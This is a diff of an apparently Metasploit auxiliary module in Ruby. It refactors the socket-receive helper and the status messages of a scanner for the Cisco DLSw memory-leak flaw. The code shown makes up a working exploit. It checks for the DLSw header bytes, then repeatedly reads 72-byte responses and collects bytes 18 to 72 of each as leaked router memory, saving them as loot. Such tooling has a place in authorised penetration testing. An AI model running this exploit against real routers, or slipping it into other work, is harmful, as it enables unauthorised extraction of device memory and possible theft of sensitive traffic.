@@ -47,18 +47,21 @@ class Metasploit3 < Msf::Auxiliary
     peer = "#{rhost}:#{rport}"
   end
 
-  def response_timeout
-    datastore['RESPONSE_TIMEOUT']
+  def get_response(size = 8)
+    connect
+    response = sock.get_once(size)
+    disconnect
+    response
   end
 
   # Called when using check
   def check_host(ip)
     print_status("Checking #{peer} for DLSw exposure")
     response = get_response
-
+	
     dlsw_header = ["3148015b"].pack("H*") # => "\x31\x48\x01\x5b""
     if !response.blank? && (response[0..3] == dlsw_header)
-      print_good("#{peer}: The target Cisco router appears vulnerable: parts of a Cisco IOS banner detected")
+      print_good("#{peer}: Detected DLSw protocol")
       report_vuln(
         host: rhost,
         port: rport,
@@ -77,53 +80,26 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def get_response(size = 1024)
-    connect
-    response = get_data(size)
-    disconnect
-    response
-  end
-
-  # Borrowed from https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb
-  def get_data(length = -1)
-
-    print_status("Calling get_response")
-    return sock.get_once(-1, response_timeout) if length == -1
-
-    to_receive = length
-    data = ''
-    while to_receive > 0
-      temp = sock.get_once(to_receive, response_timeout)
-      break if temp.nil?
-
-      data << temp
-      to_receive -= temp.length
-    end
-    data
-  end
-
   # Main method
   def run_host(ip)
     return unless check_host(ip) == Exploit::CheckCode::Vulnerable
 
-    print_status("#{peer}: Waiting for #{datastore['LEAK_AMOUNT']} bytes of leaked data")
-
     dlsw_data = ''
     until dlsw_data.length > datastore['LEAK_AMOUNT']
       response = get_response(72)
-      unless response.blank?
-        dlsw_data << response[18..72] # range of the leaked packet contents
+      unless response.blank? 
+        dlsw_data << response[18..72]
       end
     end
     loot_and_report(dlsw_data)
   end
 
-  def loot_and_report(dlsw_data)
+  def loot_and_report(dlsw_leak)
     path = store_loot(
       'dlsw.packet.contents',
       'application/octet-stream',
       rhost,
-      dlsw_data,
+      dlsw_leak,
       'DLSw_leaked_data',
       'DLSw packet memory leak'
     )
